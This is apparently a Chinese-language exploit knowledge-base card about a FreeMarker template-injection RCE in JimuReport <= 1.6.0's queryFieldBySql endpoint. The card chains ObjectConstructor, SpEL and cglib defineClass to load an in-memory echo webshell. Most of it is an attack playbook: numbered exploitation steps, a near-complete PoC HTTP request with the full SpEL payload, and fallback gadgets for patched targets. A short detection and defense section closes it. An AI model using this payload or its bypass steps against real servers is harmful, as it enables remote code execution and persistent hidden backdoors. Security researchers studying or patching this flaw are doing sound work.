---
id: web-java-component-jimureport-queryfieldbysql-objectconstructor-spel-defineclass
title: JimuReport <=1.6.0 queryFieldBySql 的 ObjectConstructor→SpEL 变体：SpelExpressionParser 执行 T(cglib ReflectUtils).defineClass 装载回显内存马，1.6.1 用 SAFER_RESOLVER 修复
type: scenario
domain: web
path: web/java/component
technique: jimureport-queryfieldbysql-objectconstructor-spel-defineclass
tags:
- java
- jimureport
- jeecgboot
- freemarker
- ssti
- spel
- defineclass
- memshell
- rce
cve: []
severity: critical
confidence: medium
affected_versions: JimuReport <= v1.6.0（1.6.1 修复）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V562
  verified_at: '2026-11-12T07:44:40+08:00'
  notes: '已对照原文与全部15张截图核对（15/15可读，无需降采样）：图02入口c(@RequestBody)与i.a(sql)黑名单、图03关键字黑名单、图04 load_file("/etc/passwd")可解析且回显、图05/06/07/08/09 parseReportSql→f.a→FreeMarkerUtils.a→new Template(...).process(...)调用链、图10 ObjectConstructor.exec(classname/ClassUtil.forName/BeansWrapper.newInstance)、图11 Burp实测POST /jmreport/queryFieldBySql(cmd: ls -la, SpEL payload)响应200回显docker-compose.yml/pom.xml/src目录、图12/13 1.6.0与1.6.1反编译对比新增setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)且拒ObjectConstructor/Execute/JythonRuntime、图14/15 testConnection与mysql allowLoadLocalInfile细节，均与卡一致。affected_versions已落库为''JimuReport <= v1.6.0（1.6.1 修复）''，原文标题及正文明确写影响版本<=v1.6.0，1.6.1修复有反编译对比支撑。dedup：与既有Nashorn卡同入口/同ObjectConstructor但中间执行层为SpEL而非ScriptEngineManager，依赖spring-expression/cglib且适配JDK15+，与Execute卡(1.5.6)、SpEL网关卡(不同入口)均非同链；库内既有Execute/Nashorn/Aviator按gadget分卡粒度，判定新增成立，保留。被跳过的Execute SSTI(既有卡)、testConnection pgjdbc/h2(既有两卡)均确认已有覆盖，无漏抽。未验证点：未在本地复现，Base64马按目标环境生成。'
url: /docs/web/java/component/web-java-component-jimureport-queryfieldbysql-objectconstructor-spel-defineclass/
draft: false
kb_aliases:
- JimuReport SpEL 内存马
- queryFieldBySql ObjectConstructor SpEL
- SpelExpressionParser defineClass
- SpringEcho 回显
- JimuReport 1.6.1 SAFER_RESOLVER 修复
---

# 一句话结论

JimuReport <= v1.6.0 的 `/jmreport/queryFieldBySql` 把 `sql` 当 FreeMarker 模板渲染，用 `freemarker.template.utility.ObjectConstructor?new()` 构造 `org.springframework.expression.spel.standard.SpelExpressionParser`，再让 SpEL 执行 `T(org.springframework.cglib.core.ReflectUtils).defineClass(...)` 配合 `javax.management.loading.MLet` 类加载器把 Base64 字节码定义为内存类，即可在目标 JVM 内装载回显/内存马并在 HTTP 响应中拿到命令输出；1.6.1 通过 `TemplateClassResolver.SAFER_RESOLVER` 禁止 `ObjectConstructor` 修复。

# 原理

- **入口**：`/jmreport/queryFieldBySql` 取请求 JSON 的 `sql` 字段，先经 `i.a(sql)` 做 SQL 关键字黑名单校验，再交给 `parseReportSql`；后者最终调用 `FreeMarkerUtils.a`，用 `new Template("template", new StringReader(sql), cfg).process(...)` 把 `sql` 当模板渲染。渲染发生在执行 SQL 之前，因此模板表达式里的代码已经在服务器执行。
- **ObjectConstructor 是通用构造器**：`freemarker.template.utility.ObjectConstructor` 的 `exec(List args)` 取 `args.get(0)` 作为类名，`ClassUtil.forName` 加载后由 `BeansWrapper.newInstance(cl, args[1:])` 构造对象。只要 FreeMarker 的类解析器未收紧，模板里就能实例化任意带公开构造器的类。
- **转到 SpEL**：文章用 ObjectConstructor 构造 `SpelExpressionParser`，调用 `parseExpression("<SpEL>").getValue()`。SpEL 的 `T(类全名)` 语法可以直接引用任意类、调用静态方法；这里用 `T(org.springframework.cglib.core.ReflectUtils).defineClass('tools.SpringEcho', T(org.springframework.util.Base64Utils).decodeFromString('<base64>'), new javax.management.loading.MLet(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader()))` 把 Base64 字节码定义成类，并用 MLet 作为类加载器。
- **为什么用 MLet**：`ReflectUtils.defineClass` 需要一个 `ClassLoader` 参数；MLet 是 JDK 自带的可实例化 URLClassLoader，构造参数为空 URL 数组与当前线程 ContextClassLoader，正好满足调用签名，避免依赖目标应用的特定类加载器。
- **为什么 SpEL 路线有价值**：JDK 15+ 已移除 Nashorn，`ScriptEngineManager`→`js` 路线失效；Spring Boot 应用通常自带 spring-expression 与 cglib，`ObjectConstructor`+SpEL 成为不依赖脚本引擎的替代装载路径。文章在 1.6.0 实测：请求带 `cmd: ls -la` 头，响应体直接返回了目录列表，证明回显马已注册并执行命令。
- **修复原理**：对比 jimureport-spring-boot-starter 1.6.0 与 1.6.1，1.6.1 在 `FreeMarkerUtils.a` 中新增 `var2.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`；SAFER_RESOLVER 明确拒绝解析 `ObjectConstructor`、`Execute` 与 `freemarker.template.utility.JythonRuntime` 三类，因此 `?new()` 构造链在 1.6.1 被拦截。

# 触发条件

- 目标为 JimuReport <= v1.6.0（1.6.1 起修复），暴露 `/jmreport/queryFieldBySql`（上下文可能带 `/jeecg-boot` 前缀）。
- 接口未鉴权或攻击者已有可用 token；`sql` 字段可提交 FreeMarker 模板语法（`${...}`、`?new`）。
- FreeMarker 未启用 `SAFER_RESOLVER`/`ALLOWS_NOTHING_RESOLVER` 等收紧策略（1.6.0 默认允许 `ObjectConstructor`）。
- 目标 classpath 含 spring-expression（`SpelExpressionParser`）、spring-core（`cglib.core.ReflectUtils`）与 JDK 的 `javax.management.loading.MLet`；这是 Spring Boot 应用的常见组合。

# 利用步骤

1. 探测接口：向 `/jmreport/queryFieldBySql` 发送 `{"sql":"select 1","type":"0"}`，确认可达与返回结构（`dbSource`/`type` 按目标要求补全）。
2. 验证模板渲染：发送 `{"sql":"select '${7*7}'"}`，看响应/错误中是否出现 `49`，确认 `sql` 被当模板渲染。
3. 准备回显马字节码：用内存马生成器生成 `tools.SpringEcho` 形态的 Base64 字节码（文章用 Memoryshell-JavaALL）。
4. 组装 ObjectConstructor→SpEL payload：在 `sql` 中放入 `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('tools.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('<BASE64>'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))").getValue()}`；注意 JSON 转义与 payload 长度。
5. 发送后按回显马约定带命令头（文章为 `cmd: ls -la`），在响应体中读取命令输出；响应体出现目录列表即执行成功。
6. 若 `ObjectConstructor` 被拒（1.6.1 或收紧解析器），改用 `Execute`、jeecg.compute Aviator、Nashorn（JDK 8~14）等已有变体；若模板本身被过滤，改用 `/jmreport/save` 单元格表达式入口。

# PoC

```http
POST /jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.111.178:8085
Content-Type: application/json;charset=UTF-8
cmd: ls -la

{
  "sql": "${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('tools.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('<BASE64 字节码>'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))").getValue()}",
  "dbSource": "",
  "type": "0"
}
```

```text
文章实测（1.6.0，目标 192.168.111.178:8085）：响应 200，body 直接返回 `ls -la` 的目录列表
（drwxr-xr-x ... docker-compose.yml、pom.xml、src 等），证明 SpringEcho 回显马已装载并执行命令。
无完整可独立运行的 PoC：Base64 字节码需按目标环境用内存马生成器重新生成。
```

# 变体与关联

- 同入口的其它链：`web-java-component-jimureport-queryfieldbysql-execute-ssti-rce`（`?new Execute` 直接命令执行）、`web-java-component-jimureport-queryfieldbysql-objectconstructor-nashorn-memshell`（ObjectConstructor→ScriptEngineManager→Nashorn→defineClass）、`web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce`（jeecg.compute Aviator）。本卡差异是用 SpEL 替代 Nashorn，适配 JDK 15+ 且 classpath 有 Spring 的目标。
- 关联：`web-java-expression-spel-spring-cloud-gateway-22947-defineclass-mlet-memshell` 覆盖同一 `ReflectUtils.defineClass + MLet` SpEL gadget 在 Spring Cloud Gateway 入口的使用；本卡是它在 JimuReport FreeMarker 模板注入中的落地。
- 关联：`web-java-component-jimureport-save-cell-expression-injection-rce`（`/jmreport/save` 表达式入口）、`web-java-component-jimureport-queryfieldbysql-freemarker-include-file-read`（同入口文件读取）、`web-java-component-jimureport-queryfieldbysql-time-blind-sqli`（同入口 SQL 盲注）。
- 版本边界：文章对比 1.6.0 与 1.6.1，1.6.1 新增 `SAFER_RESOLVER` 后 `ObjectConstructor/Execute/JythonRuntime` 三类不可解析；遇到 1.6.1+ 需转向未被点名的其它 gadget 或其它入口。
- 边界：SpEL 链依赖 spring-expression/spring-core 与 MLet 构造签名；不同 Spring 版本 `ReflectUtils.defineClass` 的签名与可达性可能变化；回显马需与目标容器/Servlet 版本匹配。

# 检测与防御

- 检测：`/jmreport/queryFieldBySql`（以及 `/loadTableData`、`/save`）请求体 `sql` 中出现 `ObjectConstructor`、`SpelExpressionParser`、`parseExpression`、`T(org.springframework`、`ReflectUtils`、`defineClass`、`MLet`、`Base64Utils` 等组合；对 JSON 值做 Base64/反转/URL 解码后再匹配一次。
- 检测：响应体出现异常的命令输出/目录列表而请求本应只是 SQL 解析；同一接口短时间大量“SQL 解析失败”但客户端持续换 payload；JVM 内出现发布包之外的类名（RASP/agent 枚举 defineClass 调用）。
- 防御：升级 JimuReport 到 1.6.1+（SAFER_RESOLVER），或显式配置 `ALLOWS_NOTHING_RESOLVER`/自定义白名单解析器；禁止把用户输入当 FreeMarker 模板，改为参数化查询；对 `/jmreport/*` 强制鉴权与来源限制；生产环境移除不必要的 MLet/脚本引擎依赖，缩小 gadget 面。
